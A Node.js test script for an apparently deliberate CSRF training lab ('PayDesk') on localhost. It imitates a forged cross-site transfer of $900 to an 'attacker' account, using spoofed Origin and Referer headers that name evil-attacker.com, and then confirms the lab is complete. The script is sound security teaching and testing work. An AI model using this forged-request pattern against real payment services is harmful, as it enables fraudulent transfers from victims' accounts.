const http = require('http');

function makeRequest(options, postData) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          data: data
        });
      });
    });

    req.on('error', (e) => reject(e));

    if (postData) {
      req.write(postData);
    }
    req.end();
  });
}

function extractCookie(headers) {
  const setCookie = headers['set-cookie'];
  if (!setCookie) return null;
  return setCookie[0].split(';')[0];
}

async function runTest() {
  console.log('--- Testing PayDesk Lab ---');
  let sessionCookie = null;

  try {
    // 1. Initial Request to get session cookie
    console.log('[*] Accessing paydesk homepage...');
    let res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/paydesk/',
      method: 'GET'
    });
    sessionCookie = extractCookie(res.headers);
    console.log(`[+] Session Cookie: ${sessionCookie}`);

    // Reset lab first just in case
    await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/paydesk/reset',
      method: 'POST',
      headers: {
        'Cookie': sessionCookie
      }
    });

    // 2. Normal Workflow: Transfer to a legitimate user
    console.log('[*] Normal Workflow: Transferring $50 to friend...');
    let postData = 'to=friend&amount=50';
    res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/paydesk/transfer',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(postData),
        'Cookie': sessionCookie,
        'Referer': 'http://localhost:3000/labs/paydesk' // Legitimate referer
      }
    }, postData);
    console.log(`[+] Normal Transfer Status: ${res.statusCode}`);

    // 3. Manipulated Workflow: CSRF attack
    console.log('[*] Manipulated Workflow: Simulating CSRF attack to transfer to "attacker"...');
    // In a real CSRF, the attacker hosts a page that auto-submits a form to this endpoint.
    // The victim's browser automatically attaches the session cookie.
    // We simulate this by sending the request without a legitimate referer but with the cookie.
    postData = 'to=attacker&amount=900';
    res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/paydesk/transfer',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(postData),
        'Cookie': sessionCookie,
        'Origin': 'http://evil-attacker.com',
        'Referer': 'http://evil-attacker.com/exploit.html'
      }
    }, postData);
    console.log(`[+] CSRF Transfer Status: ${res.statusCode}`);

    // 4. Verify Lab Completion
    console.log('[*] Verifying Lab Completion...');
    res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/paydesk/',
      method: 'GET',
      headers: {
        'Cookie': sessionCookie
      }
    });

    if (res.data.includes('Lab Completed!') || res.data.includes('Fraud Alert Triggered')) {
      console.log('[+] SUCCESS: Lab completion verified!');
    } else {
      console.log('[-] FAILURE: Lab did not complete.');
      process.exit(1);
    }

  } catch (err) {
    console.error('Error during test:', err.message);
  }
}

runTest();
